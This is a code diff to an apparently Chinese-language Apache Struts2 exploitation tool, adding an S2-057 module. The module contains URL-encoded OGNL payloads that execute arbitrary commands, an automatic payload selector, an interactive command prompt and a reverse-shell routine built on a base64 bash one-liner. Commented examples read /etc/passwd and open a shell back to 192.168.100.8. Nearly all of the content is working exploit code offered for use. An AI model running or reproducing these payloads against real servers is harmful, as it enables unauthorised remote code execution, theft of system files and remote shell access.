@@ -60,6 +60,27 @@ def get(url, headers=None, encoding='UTF-8'):
         return 'ERROR:' + str(e)
 
 
+def get_302(url, headers=None, encoding='UTF-8'):
+    """GET请求发送包装"""
+    try:
+        html = requests.get(url, headers=headers, proxies=proxies, timeout=_tiemout, allow_redirects=False)
+        status_code = html.status_code
+        if status_code == 302:
+            html = html.headers.get("Location", "")
+        elif status_code == 200:
+            html = html.content.decode(encoding)
+            html = html.replace('\x00', '').strip()
+        else:
+            html = ""
+        return html
+    except ConnectionError as e:
+        return "ERROR:" + "HTTP连接错误"
+    except ConnectTimeout as e:
+        return "ERROR:" + "HTTP连接超时错误"
+    except Exception as e:
+        return 'ERROR:' + str(e)
+
+
 def get_stream(url, headers=None, encoding='UTF-8'):
     """分块接受数据"""
     try:
@@ -1284,22 +1305,91 @@ class S2_devMode:
         return html
 
 
+class S2_057:
+    """S2-057漏洞检测利用类"""
+    info = "[+] S2-057:影响版本Struts 2.0.4-2.3.34, Struts 2.5.0-2.5.16; GET请求发送数据; 支持任意命令执行和反弹shell"
+    check_poc = "%24%7BNUM1%2BNUM2%7D"
+    exec_payload1 = "%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27{cmd}%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D"
+    exec_payload2 = "%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27{cmd}%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D"
+    exec_payload3 = "%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27{cmd}%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D"
+    exec_payload4 = "%24%7B%0A%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27{cmd}%27%29%29.%28@org.apache.commons.io.IOUtils@toString%28%23a.getInputStream%28%29%29%29%7D"
+    shell = "bash -c {echo,SHELL}|{base64,-d}|{bash,-i}"
+
+    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
+        if url.endswith(".action"):
+            rindex = url.rindex('/')
+            self.url = url[:rindex + 1]
+            self.name = url[rindex + 1:]
+        elif url.endswith("/"):
+            self.url = url
+            self.name = "index.action"
+        else:
+            self.url = url + '/'
+            self.name = "index.action"
+        self.headers = parse_headers(headers)
+        self.encoding = encoding
+        self.is_vul = False
+
+    def check(self):
+        """检测漏洞是否存在"""
+        num1 = random.randint(10000, 100000)
+        num2 = random.randint(10000, 100000)
+        poc = self.check_poc.replace("NUM1", str(num1)).replace("NUM2", str(num2))
+        url = self.url + poc + "/" + self.name
+        html = get_302(url, self.headers, self.encoding)
+        if str(html).startswith("ERROR:"):
+            return html
+        if str(num1 + num2) in html:
+            self.is_vul = True
+            return 'S2-057'
+        return self.is_vul
+
+    def choice_exp(self):
+        """选择可用的exp"""
+        payloads = [self.exec_payload1, self.exec_payload2, self.exec_payload3, self.exec_payload4]
+        hash_str = get_hash()
+        for exp in payloads:
+            payload = exp.format(cmd=quote("echo " + hash_str))
+            url = self.url + payload + "/" + self.name
+            html = get_302(url, self.headers, self.encoding)
+            if hash_str in html:
+                return exp
+        return "ERROR: 无可用Payload!"
+
+    def exec_cmd(self, cmd):
+        """执行命令"""
+        exp = self.choice_exp()
+        if exp.startswith('ERROR:'):
+            return exp
+
+        payload = exp.format(cmd=quote(cmd))
+        url = self.url + payload + "/" + self.name
+        html = get_302(url, self.headers, self.encoding)
+        return html
+
+    def reverse_shell(self, ip, port):
+        """反弹shell"""
+        html = reverse_shell(self, ip, port)
+        return html
+
+
 # 所有漏洞名称
 s2_dict = {'S2_001': S2_001, 'S2_003': S2_003, 'S2_005': S2_005, 'S2_007': S2_007, 'S2_008': S2_008, 'S2_009': S2_009,
            'S2_012': S2_012, 'S2_013': S2_013, 'S2_015': S2_015, 'S2_016': S2_016, 'S2_019': S2_019, 'S2_029': S2_029,
            'S2_032': S2_032, 'S2_033': S2_033, 'S2_037': S2_037, 'S2_045': S2_045, 'S2_046': S2_046, 'S2_048': S2_048,
-           'S2_052': S2_052, 'S2_053': S2_053, 'S2_devMode': S2_devMode}
+           'S2_052': S2_052, 'S2_053': S2_053, 'S2_devMode': S2_devMode, "S2_057": S2_057}
 # S2-052不支持漏洞扫描和检查
 s2_list = [S2_001, S2_003, S2_005, S2_007, S2_008, S2_009, S2_012, S2_013, S2_015, S2_016, S2_019,
-           S2_029, S2_032, S2_033, S2_037, S2_045, S2_046, S2_048, S2_053, S2_devMode]
+           S2_029, S2_032, S2_033, S2_037, S2_045, S2_046, S2_048, S2_053, S2_devMode, S2_057]
 # 支持获取WEB路径的漏洞名称列表
 webpath_names = ["S2_001", "S2_005", "S2_013", "S2_016", "S2_019", "S2_032", "S2_037", "S2_045", "S2_046", "S2_devMode"]
 # 支持命令执行的漏洞名称列表
 exec_names = ["S2_001", "S2_003", "S2_005", "S2_007", "S2_008", "S2_009", "S2_013", "S2_015", "S2_016", "S2_019",
-              "S2_029", "S2_032", "S2_033", "S2_037", "S2_045", "S2_046", "S2_048", "S2_052", "S2_052", "S2_devMode"]
+              "S2_029", "S2_032", "S2_033", "S2_037", "S2_045", "S2_046", "S2_048", "S2_052", "S2_052", "S2_devMode",
+              "S2_057"]
 # 支持反弹shell的漏洞名称列表
 reverse_names = ["S2_001", "S2_007", "S2_008", "S2_009", "S2_013", "S2_015", "S2_016", "S2_019", "S2_029", "S2_032",
-                 "S2_033", "S2_037", "S2_045", "S2_046", "S2_048", "S2_052", "S2_052", "S2_devMode"]
+                 "S2_033", "S2_037", "S2_045", "S2_046", "S2_048", "S2_052", "S2_052", "S2_devMode", "S2_057"]
 # 支持文件上传的漏洞名称列表
 upload_names = ["S2_013", "S2_016", "S2_019", "S2_045", "S2_046"]
 
@@ -1317,8 +1407,8 @@ banner = """
 def show_info():
     """漏洞详情介绍"""
     click.secho("[+] 支持如下Struts2漏洞:", fg='red')
-    for s in s2_list:
-        click.secho(s.info, fg='green')
+    for k, v in s2_dict.items():
+        click.secho(v.info, fg='green')
 
 
 def check_one(s):
@@ -1449,7 +1539,7 @@ def main(info, version, url, file, name, data, header, encode, proxy, exec, reve
         if exec:
             if name in exec_names:
                 if name == "S2_052":
-                    click.secho("[+] 提示: S2_052命令执行无回显，可将结果写入问价访问", fg='red')
+                    click.secho("[+] 提示: S2_052命令执行无回显，可将结果写入文件访问", fg='red')
                 while True:
                     cmd = input('>>>')
                     result = s.exec_cmd(cmd)
@@ -1465,11 +1555,10 @@ if __name__ == '__main__':
     try:
         main()
     except KeyboardInterrupt as e:
-        pass
+        exit(0)
     except Exception as e:
         click.secho("[ERROR] {error}".format(error=e), fg='red')
         exit(0)
-
 
 # s = S2_001("http://192.168.100.8:8080/login.action")
 # print(s.info)
@@ -1606,3 +1695,8 @@ if __name__ == '__main__':
 # print(s.get_path())
 # print(s.exec_cmd('ls -la'))
 # s.reverse_shell('192.168.100.8', '8888')
+
+# s = S2_057("http://192.168.100.8:8080/showcase/actionChain1.action")
+# print(s.check())
+# print(s.exec_cmd("cat /etc/passwd"))
+# s.reverse_shell("192.168.100.8", 9999)
